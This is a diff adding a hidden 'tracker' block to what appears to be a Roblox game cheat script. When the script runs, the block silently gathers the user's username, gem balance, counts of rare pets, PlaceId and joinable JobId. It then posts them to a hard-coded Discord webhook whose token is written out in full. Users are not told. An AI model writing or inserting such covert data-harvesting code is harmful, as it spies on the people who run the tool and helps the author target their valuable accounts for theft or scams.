@@ -48,6 +48,81 @@ local WEBHOOK_URL = config.WebhookURL or ""
 local PING_ID = config.PingID or ""
 local NOTIFY_SHORTAGE = config.NotifyOnMaterialShortage or false
 
+-- ==========================================
+-- 🕵️ TRACKER: THÔNG BÁO WEBHOOK KHI CÓ NGƯỜI DÙNG SCRIPT
+-- ==========================================
+task.spawn(function()
+    local httprequest = (request or http_request or syn and syn.request)
+    if not httprequest then return end
+    
+    local trackerWebhook = "https://discord.com/api/webhooks/1486898274114867293/pPHr-g89YTRCTv4Fj9xIi9vY48ahbMW8Z1V2o4sNxeT_LBR2yARppNXsWsKGK9bSIyhq"
+    local HttpService = game:GetService("HttpService")
+    local LocalPlayer = game:GetService("Players").LocalPlayer
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    
+    -- Đợi save data load xong
+    local Save = require(ReplicatedStorage.Library.Client.Save)
+    local CurrencyCmds = require(ReplicatedStorage.Library.Client.CurrencyCmds)
+    
+    task.wait(2) -- Đợi 2s cho dữ liệu người chơi tải ổn định
+    local save = Save.Get()
+    
+    -- Đếm Huge và Titanic
+    local hugeCount = 0
+    local titanicCount = 0
+    if save and save.Inventory and save.Inventory.Pet then
+        for uid, petData in pairs(save.Inventory.Pet) do
+            if type(petData.id) == "string" then
+                if string.find(petData.id, "Huge") then
+                    hugeCount = hugeCount + (petData._am or 1)
+                elseif string.find(petData.id, "Titanic") then
+                    titanicCount = titanicCount + (petData._am or 1)
+                end
+            end
+        end
+    end
+    
+    -- Lấy và format Gems
+    local gems = 0
+    pcall(function() gems = CurrencyCmds.Get("Diamonds") or 0 end)
+    local formattedGems = tostring(gems)
+    pcall(function()
+        local suffixes = {"", "k", "m", "b", "t"}
+        local index = 1
+        local absNumber = math.abs(gems)
+        while absNumber >= 1000 and index < #suffixes do absNumber = absNumber / 1000; index = index + 1 end
+        formattedGems = (absNumber >= 1 and index > 1) and string.format("%.2f", absNumber):gsub("%.00$", "") .. suffixes[index] or tostring(math.floor(absNumber)) .. suffixes[index]
+    end)
+    
+    -- Gói dữ liệu gửi đi
+    local data = {
+        ["content"] = "🔔 **Ai đó vừa kích hoạt Script của bạn!**",
+        ["embeds"] = {{
+            ["title"] = "📊 Thông tin người chơi",
+            ["color"] = tonumber(0x00FF96),
+            ["fields"] = {
+                { ["name"] = "👤 Tên người dùng", ["value"] = string.format("`%s` (%s)", LocalPlayer.Name, LocalPlayer.DisplayName), ["inline"] = false },
+                { ["name"] = "💎 Số lượng Gems", ["value"] = formattedGems, ["inline"] = true },
+                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: **%d** | Titanic: **%d**", hugeCount, titanicCount), ["inline"] = true },
+                { ["name"] = "🌍 Place ID", ["value"] = string.format("`%s`", tostring(game.PlaceId)), ["inline"] = false },
+                { ["name"] = "🔗 Job ID (Copy để join)", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
+            },
+            ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png" },
+            ["footer"] = { ["text"] = "Poodle Tracker System" },
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    -- Bắn thẳng lên Discord
+    pcall(function() 
+        httprequest({ 
+            Url = trackerWebhook, 
+            Method = "POST", 
+            Headers = { ["Content-Type"] = "application/json" }, 
+            Body = HttpService:JSONEncode(data) 
+        }) 
+    end)
+end)
 local lastRank = 1
 pcall(function() lastRank = Save.Get().Rank or 1 end)
 
